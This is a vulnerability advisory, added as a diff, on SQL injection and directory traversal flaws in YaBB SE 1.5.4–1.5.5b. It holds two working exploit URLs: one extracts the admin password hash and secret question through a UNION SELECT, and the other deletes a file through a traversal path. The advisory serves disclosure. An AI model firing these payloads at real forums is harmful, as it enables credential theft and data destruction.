@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/9774/info
+ 
+It has been reported that YaBB SE may be prone to multiple vulnerabilities due to improper input validation. The issues may allow an attacker to carry out SQL injection and directory traversal attacks. Successful exploitation of these issues may allow an attacker to gain access to sensitive information that may be used to mount further attacks against a vulnerable system. The SQL injection vulnerabilities can be exploited to gain access to user authentication credentials and corrupt user information in the underlying database.
+ 
+YaBB SE versions 1.5.4, 1.5.5, and 1.5.5b are reported to be affected by these issues, however it is possible that other versions are vulnerable as well.
+
+http://www.example.com/forum/index.php?board=1;action=modify;threadid=1;quote=1;start=0;sesc=aae1f7d45d5e54c853e9e2314fb982a1;msg=-12)+UNION+SELECT+3,null,2,concat(passwd,%27-%2
+7,secretQuestion),null,null,null,null,null,null,null,null,null,null,null,null+FROM+yabbse_members+where+ID_MEMBER=1/*
+
+http://www.example.com/forum/index.php?board=1;action=modify2;delAttach=on;attachOld=../../../../d
+eleteme.txt;subject=hola;message=hola;postid=-1+UNION+SELECT+null,3,null,nul
+l,null,null,null,null,null,null,null,null/* HTTP/1.0
